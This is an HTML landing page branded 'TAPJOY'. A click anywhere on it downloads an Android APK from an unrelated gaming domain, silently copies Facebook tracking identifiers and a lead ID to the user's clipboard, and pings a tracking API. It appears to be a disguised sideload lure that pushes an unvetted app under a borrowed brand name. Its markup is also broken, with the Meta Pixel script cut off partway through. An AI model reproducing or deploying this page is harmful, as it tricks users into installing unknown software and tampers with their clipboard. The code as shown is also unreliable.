<html lang="en" style="cursor: pointer">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no" />
  <link rel="shortcut icon" href="/favicon.ico" />
  <title>TAPJOY</title>
  <style>
    html,
    body {
      margin: 0;
      padding: 0;
      font-family: "Arial", sans-serif;
    }

    body {
      -webkit-font-smoothing: antialiased;
      background-color: black;
      display: flex;
      justify-content: center;
    }

    img {
      margin: 0;
      padding: 0;
    }

    .container {
      width: 100%;
      height: 100vh;
      position: relative;
      max-width: 550px;
      overflow: hidden;
    }

    .container .BG {
      width: 100%;
      height: 100%;
      object-fit: cover;
      object-position: center;
      display: block;
    }
  </style>

  <!-- Meta Pixel Code -->
  <script>
    !(function (f, b, e, v, n, t, s) {
      if (f.fbq) return;
      n = f.fbq = function () {
        n.callMethod
          ? n.callMethod.apply(n, arguments)
          : n.queue.push(arguments);
      };
      if (!f._fbq) f._fbq = n;
      n.push = n;
      n.loaded = !0;
      n.version = "2.0";
      n.queue = [];

<body onclick="onClickBtn()">
  <div class="container">
    <img class="BG" src="files/background.jpg" alt="background" />
  </div>
  <script src="files/common.js"></script>
  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const APK_NAME = "tapjoy.prod.6.14.684450.apk";
    const APK_BASE = "https://downloads.afbgaming.app/";
    const API_BASE = "https://api.anubisriches.com/api/advertising";

    function sendTrack(endpoint) {
      fetch(getUrl(API_BASE + endpoint)).catch(() => { });
    }

    window.onload = function () {
      sendTrack("/onshow");
    };

    function downloadApk() {
      const a = document.createElement("a");
      a.href = APK_BASE + APK_NAME;
      a.download = "";
      a.addEventListener("click", (e) => e.stopPropagation());
      document.body.appendChild(a);
      a.click();
      setTimeout(() => a.remove(), 5000);
    }

    function onClickBtn() {
      const leadId = urlParams.get("leadId") || "";
      const fbc = urlParams.get("fbclid") || "";
      const fbp = getCookie("_fbp") || "";
      const { origin, pathname } = window.location;

      const copyParam = {
        fbc,
        fbp,
        leadId,
        link: getUrl(origin + pathname),
      };
      copyText(JSON.stringify(copyParam));
      downloadApk();
      sendTrack("/ondownload");
    }
  </script>
</body>

</html>
